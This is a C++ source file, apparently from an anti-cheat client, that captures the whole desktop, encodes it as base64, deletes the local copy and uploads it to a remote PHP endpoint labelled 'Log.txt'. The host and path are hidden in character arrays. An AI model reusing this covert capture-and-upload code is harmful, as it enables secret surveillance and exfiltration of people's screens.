#include "ProjectMain.h"
#include "Functions.h"
#include "DynamicWinapi.h"
#include <GdiPlus.h>
#include "Base64.h"
#include "DirFuncs.h"
#include "InternetAPI.h"
#include "CLog.h"
#include "XOR.h"

#ifdef SCRENSHOT_FEATURE
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	ImageCodecInfo* pImageCodecInfo = NULL;

	UINT uiNum, uiSize = 0;
	GetImageEncodersSize(&uiNum, &uiSize);
	if (uiSize == 0)
		return -1; // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(uiSize));
	if (pImageCodecInfo == NULL)
		return -2; // Failure

	GetImageEncoders(uiNum, uiSize, pImageCodecInfo);

	for (UINT j = 0; j < uiNum; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j; // Success
		}
	}

	free(pImageCodecInfo);
	return -3; // Failure
}

int BitmapToJpg(std::wstring wszFileName, HBITMAP hbmpImage, int width, int height)
{
	Bitmap *p_bmp = Bitmap::FromHBITMAP(hbmpImage, NULL);

	CLSID pngClsid;
	WCHAR wszNewFormat[] = { L'i', L'm', L'a', L'g', L'e', L'/', L'j', L'p', L'e', L'g', L'\0' };
	int result = GetEncoderClsid(wszNewFormat, &pngClsid);
	if (result >= 0) {
		p_bmp->Save(wszFileName.c_str(), &pngClsid, NULL);

		delete p_bmp;
		return 1;
	}

#ifdef _DEBUG
	LPLog->ErrorLog(0, "BitmapToJpg: Encoding failed!");
#endif
	delete p_bmp;
	return 0;
}

int File2Mem(std::string szFileName, std::string * szOutput)
{
	HANDLE hFile = BetaFunctionTable->CreateFileA(szFileName.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
		LPLog->ErrorLog(0, "File2Mem: CreateFileA fail! Error: %u", LPWinapi->LastError());
#endif
		return -1;
	}

	DWORD dwFileSize = BetaFunctionTable->GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE || !dwFileSize) {
#ifdef _DEBUG
		LPLog->ErrorLog(0, "File2Mem: GetFileSize fail! Error: %u", LPWinapi->LastError());
#endif
		BetaFunctionTable->CloseHandle(hFile);
		return -2;
	}

	BYTE* byFileBytes = new BYTE[dwFileSize];
	if (!byFileBytes) {
#ifdef _DEBUG
		LPLog->ErrorLog(0, "File2Mem: Allocation fail! Error: %u", LPWinapi->LastError());
#endif
		BetaFunctionTable->CloseHandle(hFile);
		return -3;
	}

	DWORD dwReadBytes;
	BOOL bReadFile = BetaFunctionTable->ReadFile(hFile, byFileBytes, dwFileSize, &dwReadBytes, NULL);
	if (!bReadFile) {
#ifdef _DEBUG
		LPLog->ErrorLog(0, "File2Mem: ReadFile fail! Error: %u", LPWinapi->LastError());
#endif
		delete[] byFileBytes;
		return -4;
	}
	BetaFunctionTable->CloseHandle(hFile);

	/// Delete
	BetaFunctionTable->DeleteFileA(szFileName.c_str());

	/// Encode to base64
	CBase64 base64;
	char* cEncodedBuffer = (char*)malloc(base64.B64_length(dwFileSize) + 1);
	base64.Encrypt((const char*)byFileBytes, dwFileSize, cEncodedBuffer);
	*szOutput = cEncodedBuffer;

	// TODO: Encrypt with CFunctions::EncryptBuffer

	/// Clear
	delete[] byFileBytes;
	free(cEncodedBuffer);

	return 1;
}

std::mutex m2;
void CFunctions::SendScreenshotToServer()
{
	try
	{
		m2.lock();

		/// Temp File
		std::string szTmpFileName;
		auto hTmpFile = LPDirFunctions->CreateTempFile(&szTmpFileName);
		if (!hTmpFile || hTmpFile == INVALID_HANDLE_VALUE || szTmpFileName.empty()) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: Temp file create fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}
		BetaFunctionTable->CloseHandle(hTmpFile);

#ifdef _DEBUG
		LPLog->AddLog(0, "SaveScreenShot: Temp file created! File: %s", szTmpFileName.c_str());
#endif

		/// GDI+ Init
		ULONG_PTR gdiplusToken;
		GdiplusStartupInput gdiplusStartupInput;
		auto sGDI = GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
		if (sGDI != Status::Ok) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: GdiplusStartup fail! Error: %u", (int)sGDI);
#endif
			m2.unlock();
			return;
		}

		/// Screen configs
		RECT rcDesktop;
		HWND hwDesktop = BetaFunctionTable->GetDesktopWindow();
		if (BetaFunctionTable->GetWindowRect(hwDesktop, &rcDesktop) == FALSE) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: GetWindowRect fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}

		int iWidth = rcDesktop.right;
		int iHeight = rcDesktop.bottom;

		/// Create screenshot
		HDC hDCScreen = BetaFunctionTable->GetDC(NULL);
		if (hDCScreen == NULL) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: hDCScreen fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}

		HDC hDC = BetaFunctionTable->CreateCompatibleDC(hDCScreen);
		if (hDC == NULL) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: hDC fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}

		HBITMAP hBitmap = BetaFunctionTable->CreateCompatibleBitmap(hDCScreen, iWidth, iHeight);
		if (hBitmap == NULL) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: hBitmap fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}

		HGDIOBJ hGdiObj = BetaFunctionTable->SelectObject(hDC, hBitmap);
		if (BetaFunctionTable->BitBlt(hDC, 0, 0, iWidth, iHeight, hDCScreen, 0, 0, SRCCOPY) == FALSE) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: BitBlt fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}
		if (!BitmapToJpg(LPFunctions->UTF8ToWstring(szTmpFileName), hBitmap, iWidth, iHeight)) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: BitmapToJpg fail! Error: %u", LPWinapi->LastError());
#endif
			m2.unlock();
			return;
		}

		/// Copy screenshot to Memory
		std::string szOutput = "";
		int iF2mRet = File2Mem(szTmpFileName, &szOutput);
		if (iF2mRet < 1) {
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: File2Mem fail! Error: %d", iF2mRet);
#endif
			m2.unlock();
			return;
		}

		/// Send
		CHAR __formfilename[] = { 'L', 'o', 'g', '.', 't', 'x', 't', 0x0 }; // Log.txt
		CHAR __formname[] = { 'u', 'p', 'l', 'o', 'a', 'd', 'e', 'd', 'f', 'i', 'l', 'e', 0x0 }; // uploadedfile
		CHAR __urlname[] = { 'w', 'w', 'w', '.', 'b', 'e', 't', 'a', 's', 'h', 'i', 'e', 'l', 'd', '.', 'o', 'r', 'g', 0x0 }; // www.betashield.org
		CHAR __urllocation[] = { '/', 'x', '.', 'p', 'h', 'p', 0x0 }; // /x.php
		if ( false == LPInternetAPI->PostData(__urlname, __urllocation, __formfilename, (unsigned char*)szOutput.c_str(), szOutput.size()) )
		{
#ifdef _DEBUG
			LPLog->ErrorLog(0, "SaveScreenShot: SendBinary fail!");
#endif
			m2.unlock();
			return;
		}

#ifdef _DEBUG
		LPLog->AddLog(0, "SaveScreenShot: Temp file: %s succesfully sended to server!", szTmpFileName.c_str());
#endif

		/// Deinit GDI+
		GdiplusShutdown(gdiplusToken);
		m2.unlock();
	}

	catch (std::exception& e)
	{
#ifdef _DEBUG
		LPLog->ErrorLog(0, "SaveScreenShot: exception2 triggered! Info: %s", e.what());
#else
		UNREFERENCED_PARAMETER(e);
#endif
	}

	catch (DWORD dwError) {
#ifdef _DEBUG
		LPLog->ErrorLog(0, "SaveScreenShot: exception triggered! Error: %u", dwError);
#else
		UNREFERENCED_PARAMETER(dwError);
#endif
	}

	catch (...)
	{
#ifdef _DEBUG
		LPLog->ErrorLog(0, "SaveScreenShot: exception3 triggered!");
#endif
	}
}
#endif
